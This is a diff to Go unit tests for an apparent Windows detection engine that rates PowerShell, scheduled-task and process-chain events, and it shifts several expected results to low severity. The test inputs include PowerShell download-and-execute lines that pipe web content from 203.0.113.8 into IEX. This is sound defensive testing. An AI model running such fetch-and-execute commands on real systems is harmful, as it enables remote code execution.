@@ -20,7 +20,7 @@ func TestPowerShellWeakOptionsAreNotHigh(t *testing.T) {
 func TestPowerShellInvocationContext(t *testing.T) {
 	tests := []struct{ name, typ, proc, cmd, sev, conf string }{
 		{"literal search", model.EventPowerShellScript, "powershell.exe", `Get-Content C:\Tools\audit.txt | Select-String -Pattern '-enc|IEX|DownloadString|FromBase64String'`, "", ""},
-		{"unquoted literal search", model.EventPowerShellScript, "powershell.exe", `Get-Content C:\Tools\audit.txt | Select-String -Pattern IEX -AllMatches`, "", ""},
+		{"unquoted literal search", model.EventPowerShellScript, "powershell.exe", `Get-Content C:\Tools\audit.txt | Select-String -Pattern IEX -AllMatches`, "low", "low"},
 		{"web API request", model.EventPowerShellScript, "powershell.exe", `Invoke-WebRequest -Uri 'https://203.0.113.8/api' -Method POST -Body $data`, "", ""},
 		{"download and pipeline invoke", model.EventPowerShellScript, "powershell.exe", `Invoke-WebRequest -Uri 'https://203.0.113.8/a' | IEX`, model.SeverityHigh, model.ConfidenceMedium},
 		{"download and expression invoke", model.EventPowerShellScript, "powershell.exe", `IEX (Invoke-WebRequest 'https://203.0.113.8/a').Content`, model.SeverityHigh, model.ConfidenceMedium},
@@ -28,10 +28,10 @@ func TestPowerShellInvocationContext(t *testing.T) {
 		{"literal download expression", model.EventPowerShellScript, "powershell.exe", `Write-Output 'IEX (New-Object Net.WebClient).DownloadString("https://203.0.113.8/a")'`, "", ""},
 		{"comment download expression", model.EventPowerShellScript, "powershell.exe", `# IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')`, "", ""},
 		{"block comment download expression", model.EventPowerShellScript, "powershell.exe", `<# IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a') #> Get-Date`, "", ""},
-		{"data conversion", model.EventPowerShellScript, "powershell.exe", `$bytes=[Convert]::FromBase64String($value)`, "", ""},
+		{"data conversion", model.EventPowerShellScript, "powershell.exe", `$bytes=[Convert]::FromBase64String($value)`, "low", "low"},
 		{"file arguments", model.EventProcessCreate, "powershell.exe", `powershell.exe -File C:\Tools\search.ps1 -enc IEX DownloadString`, "", ""},
 		{"wrong flag", model.EventProcessCreate, "powershell.exe", `powershell.exe -encoding UTF8 -Command Get-Date`, "", ""},
-		{"wrong executable", model.EventProcessCreate, "powershell.exe", `tool.exe -enc AAAA`, "", ""},
+		{"wrong executable", model.EventProcessCreate, "powershell.exe", `tool.exe -enc AAAA`, "low", "low"},
 		{"missing identity", model.EventProcessCreate, "", `powershell.exe -enc AAAA`, "", ""},
 		{"missing command", model.EventProcessCreate, "powershell.exe", ``, "", ""},
 		{"short encoded e", model.EventProcessCreate, "powershell.exe", `powershell.exe -e AAAA`, model.SeverityMedium, model.ConfidenceMedium},
@@ -88,8 +88,8 @@ func TestTaskConfigurationSelectsActionEvidence(t *testing.T) {
 			e.Host = "host01"
 			got := (newScheduledTask{}).Evaluate([]model.Event{e})
 			if tt.sev == "" {
-				if len(got) != 0 {
-					t.Fatalf("routine/unsupported action produced %d findings", len(got))
+				if !contextOnlyTaskFindings(got) {
+					t.Fatalf("routine/unsupported action escalated beyond context: %d findings", len(got))
 				}
 				return
 			}
@@ -179,8 +179,8 @@ func TestInvocationCatalogReflectsEvidenceLevels(t *testing.T) {
 func TestInterpreterNestingRequiresIndependentEvidence(t *testing.T) {
 	for _, pair := range [][2]string{{"cmd.exe", "cmd.exe"}, {"powershell.exe", "powershell.exe"}, {"powershell.exe", "pwsh.exe"}} {
 		e := model.Event{ID: "e", CaseID: "c", Host: "host01", User: "alice", EventType: model.EventProcessCreate, ParentProcessName: pair[0], ProcessName: pair[1], ProcessPath: `C:\Users\alice\AppData\Local\Temp\` + pair[1]}
-		if got := (suspiciousProcessChain{}).Evaluate([]model.Event{e}); len(got) != 0 {
-			t.Fatalf("nesting and writable path alone produced %d findings", len(got))
+		if got := (suspiciousProcessChain{}).Evaluate([]model.Event{e}); len(got) != 1 || got[0].Severity != "low" || got[0].Confidence != "low" {
+			t.Fatalf("nesting alone must remain low/low, got %d findings", len(got))
 		}
 	}
 	// Different child with an existing non-standard-path gate remains a review lead.
